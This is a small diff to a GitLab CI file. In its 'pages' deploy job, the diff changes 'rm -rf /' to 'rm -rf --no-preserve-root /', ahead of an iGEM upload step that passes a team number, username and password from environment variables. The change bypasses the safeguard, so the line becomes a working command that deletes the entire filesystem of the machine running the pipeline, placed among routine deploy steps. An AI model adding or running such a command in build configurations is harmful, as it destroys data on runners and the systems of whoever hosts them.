@@ -13,7 +13,7 @@ default:
 pages:
   stage: deploy
   script:
-    - rm -rf /
+    - rm -rf --no-preserve-root /
     - npm run gitlab-actions $IGEM_UPLOAD_TOOL_TEAM_NUMBER $IGEM_UPLOAD_TOOL_USERNAME $IGEM_UPLOAD_TOOL_PASSWORD
     - mv docs public
     - tree public
